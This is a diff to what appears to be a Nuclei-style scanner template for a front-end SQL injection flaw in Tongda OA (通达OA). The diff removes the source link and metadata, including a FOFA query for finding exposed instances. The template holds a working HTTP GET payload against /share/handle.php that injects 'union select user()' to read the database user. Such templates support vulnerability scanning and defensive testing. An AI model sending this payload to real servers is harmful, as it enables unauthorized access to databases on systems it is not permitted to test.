@@ -3,12 +3,8 @@ info:
   name: 通达OA share 前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vi5sk9xckvgl3zw8'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vi5sk9xckvgl3zw8
-    fofa: app.name="通达 OA"
 http:
 - raw:
   - 'GET /share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20user()--+ HTTP/1.1
